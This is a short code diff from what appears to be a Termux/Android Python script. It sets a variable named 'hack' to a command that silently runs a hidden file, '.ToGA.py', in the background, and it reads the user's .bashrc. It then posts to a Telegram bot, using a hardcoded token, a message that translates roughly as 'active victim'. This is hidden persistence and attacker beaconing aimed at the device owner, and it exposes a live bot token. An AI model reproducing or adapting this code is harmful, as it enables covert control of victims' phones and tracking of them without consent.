@@ -1,4 +1,4 @@
-hack = 'nohup python /storage/emulated/0/file.py > /dev/null 2>&1 &'
+hack = 'nohup python /storage/emulated/0/.ToGA.py > /dev/null 2>&1 &'
 try:
     read = open('/data/data/com.termux/files/home/.bashrc','r').read
     requests.post(f'''https://api.telegram.org/bot6729895335:AAGVGFp_akqbh8dUeBTjEdVuufNBe4sTiZI--NtM/sendMessage?chat_id=5210419138&text=ضحيه نشطه مع{method}''')
